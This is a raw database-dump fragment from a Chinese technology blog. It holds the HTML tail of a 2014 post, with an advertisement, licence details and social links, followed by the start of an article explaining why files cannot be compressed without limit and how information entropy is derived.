href="http://memoryhere.com/?utm_source=ruanyifeng.com">生命链记忆网</a>是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。</p>\n\n<p>花一分钟成为<a href="http://memoryhere.com/user/register">注册用户</a>，就可以使用两大基本功能：<strong>生命链</strong>和<strong>生命之书</strong>。</p>\n\n<p>（1）<strong>生命链</strong>就是你的根，你可以邀请祖先(父系和母系)及子女合链，让自己的生命链有形化、可视化；所有血亲和姻亲成员之间可互动。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014090607-1.jpg"><img alt="图1" src="http://image.beekka.com/blog/2014/bg2014090607.small_.jpg" title="" /></a></p>\n\n<p>（2）<strong>生命之书</strong>就是书写你的人生故事，包括日记、自传、随笔等等；自传可选择公开，在自传馆里能被所有人看到。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014090606-1.jpg"><img alt="图2" src="http://image.beekka.com/blog/2014/bg2014090606.small_.jpg" title="" /></a></p>\n\n<p>生命链功能永久免费！</p>\n\n<p>生命之书功能每年付费10元，可使用100M空间（免费试用6个月）；累计付费1000元，生命之书永久开启。</p>\n\n<p>永恒之旅，从此开始，<a href="http://memoryhere.com/user/register">点击试用</a>！</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-09-07T20:17:50+08:00">2014年9月 7日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/computer/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 理解计算机</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAKOWlDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanZZ3VFTXFofPvXd6oc0wAlKG3rvAANJ7k15FYZgZYCgDDjM0sSGiAhFFRJoiSFDEgNFQJFZEsRAUVLAHJAgoMRhFVCxvRtaLrqy89/Ly++Osb+2z97n77L3PWhcAkqcvl5cGSwGQyhPwgzyc6RGRUXTsAIABHmCAKQBMVka6X7B7CBDJy82FniFyAl8EAfB6WLwCcNPQM4BOB/+fpFnpfIHomAARm7M5GSwRF4g4JUuQLrbPipgalyxmGCVmvihBEcuJOWGRDT77LLKjmNmpPLaIxTmns1PZYu4V8bZMIUfEiK+ICzO5nCwR3xKxRoowlSviN+LYVA4zAwAUSWwXcFiJIjYRMYkfEuQi4uUA4EgJX3HcVyzgZAvEl3JJS8/hcxMSBXQdli7d1NqaQffkZKVwBALDACYrmcln013SUtOZvBwAFu/8WTLi2tJFRbY0tba0NDQzMv2qUP91829K3NtFehn4uWcQrf+L7a/80hoAYMyJarPziy2uCoDOLQDI3fti0zgAgKSobx3Xv7oPTTwviQJBuo2xcVZWlhGXwzISF/QP/U+Hv6GvvmckPu6P8tBdOfFMYYqALq4bKy0lTcinZ6QzWRy64Z+H+B8H/nUeBkGceA6fwxNFhImmjMtLELWbx+YKuGk8Opf3n5r4D8P+pMW5FonS+BFQY4yA1HUqQH7tBygKESDR+8Vd/6NvvvgwIH554SqTi3P/7zf9Z8Gl4iWDm/A5ziUohM4S8jMX98TPEqABAUgCKpAHykAd6ABDYAasgC1wBG7AG/iDEBAJVgMWSASpgA+yQB7YBApBMdgJ9oBqUAcaQTNoBcdBJzgFzoNL4Bq4AW6D+2AUTIBnYBa8BgsQBGEhMkSB5CEVSBPSh8wgBmQPuUG+UBAUCcVCCRAPEkJ50GaoGCqDqqF6qBn6HjoJnYeuQIPQXWgMmoZ+h97BCEyCqbASrAUbwwzYCfaBQ+BVcAK8Bs6FC+AdcCXcAB+FO+Dz8DX4NjwKP4PnEIAQERqiihgiDMQF8UeikHiEj6xHipAKpAFpRbqRPuQmMorMIG9RGBQFRUcZomxRnqhQFAu1BrUeVYKqRh1GdaB6UTdRY6hZ1Ec0Ga2I1kfboL3QEegEdBa6EF2BbkK3oy+ib6Mn0K8xGAwNo42xwnhiIjFJmLWYEsw+TBvmHGYQM46Zw2Kx8lh9rB3WH8vECrCF2CrsUexZ7BB2AvsGR8Sp4Mxw7rgoHA+Xj6vAHcGdwQ3hJnELeCm8Jt4G749n43PwpfhGfDf+On4Cv0CQJmgT7AghhCTCJkIloZVwkfCA8JJIJKoRrYmBRC5xI7GSeIx4mThGfEuSIemRXEjRJCFpB+kQ6RzpLuklmUzWIjuSo8gC8g5yM/kC+RH5jQRFwkjCS4ItsUGiRqJDYkjiuSReUlPSSXK1ZK5kheQJyeuSM1J4KS0pFymm1HqpGqmTUiNSc9IUaVNpf+lU6RLpI9JXpKdksDJaMm4ybJkCmYMyF2TGKQhFneJCYVE2UxopFykTVAxVm+pFTaIWU7+jDlBnZWVkl8mGyWbL1sielh2lITQtmhcthVZKO04bpr1borTEaQlnyfYlrUuGlszLLZVzlOPIFcm1yd2WeydPl3eTT5bfJd8p/1ABpaCnEKiQpbBf4aLCzFLqUtulrKVFS48vvacIK+opBimuVTyo2K84p6Ss5KGUrlSldEFpRpmm7KicpFyufEZ5WoWiYq/CVSlXOavylC5Ld6Kn0CvpvfRZVUVVT1Whar3qgOqCmrZaqFq+WpvaQ3WCOkM9Xr1cvUd9VkNFw08jT6NF454mXpOhmai5V7NPc15LWytca6tWp9aUtpy2l3audov2Ax2yjoPOGp0GnVu6GF2GbrLuPt0berCehV6iXo3edX1Y31Kfq79Pf9AAbWBtwDNoMBgxJBk6GWYathiOGdGMfI3yjTqNnhtrGEcZ7zLuM/5oYmGSYtJoct9UxtTbNN+02/R3Mz0zllmN2S1zsrm7+QbzLvMXy/SXcZbtX3bHgmLhZ7HVosfig6WVJd+y1XLaSsMq1qrWaoRBZQQwShiXrdHWztYbrE9Zv7WxtBHYHLf5zdbQNtn2iO3Ucu3lnOWNy8ft1OyYdvV2o/Z0+1j7A/ajDqoOTIcGh8eO6o5sxybHSSddpySno07PnU2c+c7tzvMuNi7rXM65Iq4erkWuA24ybqFu1W6P3NXcE9xb3Gc9LDzWepzzRHv6eO7yHPFS8mJ5NXvNelt5r/Pu9SH5BPtU+zz21fPl+3b7wX7efrv9HqzQXMFb0ekP/L38d/s/DNAOWBPwYyAmMCCwJvBJkGlQXlBfMCU4JvhI8OsQ55DSkPuhOqHC0J4wybDosOaw+XDX8LLw0QjjiHUR1yIVIrmRXVHYqLCopqi5lW4r96yciLaILoweXqW9KnvVldUKq1NWn46RjGHGnIhFx4bHHol9z/RnNjDn4rziauNmWS6svaxnbEd2OXuaY8cp40zG28WXxU8l2CXsTphOdEisSJzhunCruS+SPJPqkuaT/ZMPJX9KCU9pS8Wlxqae5Mnwknm9acpp2WmD6frphemja2zW7Fkzy/fhN2VAGasyugRU0c9Uv1BHuEU4lmmfWZP5Jiss60S2dDYvuz9HL2d7zmSue+63a1FrWWt78lTzNuWNrXNaV78eWh+3vmeD+oaCDRMbPTYe3kTYlLzpp3yT/LL8V5vDN3cXKBVsLBjf4rGlpVCikF84stV2a9021DbutoHt5turtn8sYhddLTYprih+X8IqufqN6TeV33zaEb9joNSydP9OzE7ezuFdDrsOl0mX5ZaN7/bb3VFOLy8qf7UnZs+VimUVdXsJe4V7Ryt9K7uqNKp2Vr2vTqy+XeNc01arWLu9dn4fe9/Qfsf9rXVKdcV17w5wD9yp96jvaNBqqDiIOZh58EljWGPft4xvm5sUmoqbPhziHRo9HHS4t9mqufmI4pHSFrhF2DJ9NProje9cv+tqNWytb6O1FR8Dx4THnn4f+/3wcZ/jPScYJ1p/0Pyhtp3SXtQBdeR0zHYmdo52RXYNnvQ+2dNt293+o9GPh06pnqo5LXu69AzhTMGZT2dzz86dSz83cz7h/HhPTM/9CxEXbvUG9g5c9Ll4+ZL7pQt9Tn1nL9tdPnXF5srJq4yrndcsr3X0W/S3/2TxU/uA5UDHdavrXTesb3QPLh88M+QwdP6m681Lt7xuXbu94vbgcOjwnZHokdE77DtTd1PuvriXeW/h/sYH6AdFD6UeVjxSfNTws+7PbaOWo6fHXMf6Hwc/vj/OGn/2S8Yv7ycKnpCfVEyqTDZPmU2dmnafvvF05dOJZ+nPFmYKf5X+tfa5zvMffnP8rX82YnbiBf/Fp99LXsq/PPRq2aueuYC5R69TXy/MF72Rf3P4LeNt37vwd5MLWe+x7ys/6H7o/ujz8cGn1E+f/gUDmPP8kcBa2wAAADxQTFRFAAAAAAAAAgICBAQEBQUFBgYGBwcHCAgICQkJCgoKDQ0NExMTOTk5c3NzdXV1eHh4eXl5enp6e3t7fHx8rr9WJAAAAAF0Uk5TAEDm2GYAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYMADMaKH8BrQAAAGVJREFUGNONkI0KwCAIhE+32n/b2vu/6yqYCRnshMCPS/SA/6Ikk5vQWXQ7gpL6H1KV54OMbCiuCk0n9rOdma3i1JteuIGIJ1bI60Se2dG4qFWDddQsSeiZpRkILfQ6Hcmvk2NPLzksA4TnEeNNAAAAAElFTkSuQmCC" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://memoryhere.com/?utm_source=ruanyifeng.com" style="border: none;" target="_blank">生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-04 08:24:11', '2014-09-07 12:17:50', 0, '[["\\u538b\\u7f29", 0.32057868941561546], ["\\u4e8c\\u8fdb\\u5236\\u4f4d", 0.24039829103153612], ["log2", 0.21890723809989823], ["\\u6587\\u4ef6", 0.2131227186310885], ["\\u4fe1\\u606f\\u71b5", 0.13377664550549337], ["\\u7b26\\u53f7", 0.11856948064032553], ["pn", 0.10945361904994912], ["\\u5185\\u5bb9", 0.09923843756222786], ["\\u53ef\\u4ee5", 0.08201194587963377], ["\\u751f\\u547d", 0.08113571863829094], ["10", 0.07296907936663274], ["p2", 0.060807566138860625], ["p1", 0.060807566138860625], ["\\u5360\\u7528", 0.05952787258162766], ["\\u6bcf\\u4e2a", 0.05323055705496439], ["\\u5b57\\u7b26\\u4e32", 0.052599026998413026], ["...", 0.0486460529110885], ["\\u6bd4\\u5982", 0.047697866191169884], ["\\u6982\\u7387\\u5206\\u5e03", 0.04503546005249237], ["\\u91cd\\u590d", 0.042219049969806716]]', NULL, NULL, '1992年，美国佐治亚州的WEB Technology公司，宣布做出了重大的技术突破。\n\n        该公司的DataFiles/16软件，号称可以将任意大于64KB的文件，压缩为原始大小的16分之一。业界议论纷纷，如果消息属实，无异于压缩技术的革命。\n\n\n\n许多专家还没有看到软件，就断言这是不可能的。因为根据压缩原理，你不可能将任意文件压缩到16分之一。事实上，有一些文件是无法压缩的，哪怕一个二进制位，都压缩不掉。\n\n后来，事实果然如此，这款软件从来没有正式发布。没过几年，就连WEB Technology公司都消失了。\n\n那么，为何不是所有的文件都可以被压缩？是否存在一个压缩极限呢，也就是说，到了一定大小，就没法再压缩了？\n\n一、压缩的有限性\n\n首先，回答第一个问题：为什么WEB Technology公司的发明不可能是真的。\n\n反证法可以轻易地证明这一点。假定任何文件都可以压缩到n个二进制位（bit）以内，那么最多有2n种不同的压缩结果。也就是说，如果有2n+1个文件，必然至少有两个文件会产生同样的压缩结果。这意味着，这两个文件不可能无损地还原（解压缩）。因此，得到证明，并非所有文件都可以压缩到n个二进制位以下。\n\n很自然地，下一个问题就是，这个n到底是多少？\n\n二、压缩原理\n\n要回答一个文件最小可以压缩到多少，必须要知道压缩的原理。\n\n压缩原理其实很简单，就是找出那些重复出现的字符串，然后用更短的符号代替，从而达到缩短字符串的目的。比如，有一篇文章大量使用"中华人民共和国"这个词语，我们用"中国"代替，就缩短了5个字符，如果用"华"代替，就缩短了6个字符。事实上，只要保证对应关系，可以用任意字符代替那些重复出现的字符串。\n\n本质上，所谓"压缩"就是找出文件内容的概率分布，将那些出现概率高的部分代替成更短的形式。所以，内容越是重复的文件，就可以压缩地越小。比如，"ABABABABABABAB"可以压缩成"7AB"。\n\n相应地，如果内容毫无重复，就很难压缩。极端情况就是，遇到那些均匀分布的随机字符串，往往连一个字符都压缩不了。比如，任意排列的10个阿拉伯数字（5271839406），就是无法压缩的；再比如，无理数（比如π）也很难压缩。\n\n压缩就是一个消除冗余的过程，相当于用一种更精简的形式，表达相同的内容。可以想象，压缩过一次以后，文件中的重复字符串将大幅减少。好的压缩算法，可以将冗余降到最低，以至于再也没有办法进一步压缩。所以，压缩已经压缩过的文件（递归压缩），通常是没有意义的。\n\n三、压缩的极限\n\n知道了压缩原理之后，就可以计算压缩的极限了。\n\n上一节说过，压缩可以分解成两个步骤。第一步是得到文件内容的概率分布，哪些部分出现的次数多，哪些部分出现的次数少；第二步是对文件进行编码，用较短的符号替代那些重复出现的部分。\n\n第一步的概率分布一般是确定的，现在就来考虑第二步，怎样找到最短的符号作为替代符。\n\n如果文件内容只有两种情况（比如扔硬币的结果），那么只要一个二进制位就够了，1表示正面，0表示表示负面。如果文件内容包含三种情况（比如球赛的结果），那么最少需要两个二进制位。如果文件内容包含六种情况（比如扔筛子的结果），那么最少需要三个二进制位。\n\n一般来说，在均匀分布的情况下，假定一个字符（或字符串）在文件中出现的概率是p，那么在这个位置上最多可能出现1/p种情况。需要log2(1/p)个二进制位表示替代符号。\n\n这个结论可以推广到一般情况。假定文件有n个部分组成，每个部分的内容在文件中的出现概率分别为p1、p2、...pn。那么，替代符号占据的二进制最少为下面这个式子。\n\n\n  log2(1/p1) + log2(1/p2) + ... + log2(1/pn)\n\n= ∑ log2(1/pn)\n\n\n这可以被看作一个文件的压缩极限。\n\n四、信息熵的公式\n\n上一节的公式给出了文件压缩的极限。对于n相等的两个文件，概率p决定了这个式子的大小。p越大，表明文件内容越有规律，压缩后的体积就越小；p越小，表明文件内容越随机，压缩后的体积就越大。\n\n为了便于文件之间的比较，将上式除以n，可以得到平均每个符号所占用的二进制位。\n\n\n  ∑ log2(1/pn) / n\n\n= log2(1/p1)/n + log2(1/p2)/n + ... + log2(1/pn)/n\n\n\n由于p是根据频率统计得到的，因此上面的公式等价于下面的形式。\n\n\n  p1*log2(1/p1) + p2*log2(1/p2) + ... + pn*log2(1/pn)\n\n= ∑ pn*log2(1/pn)\n\n= E( log2(1/p) 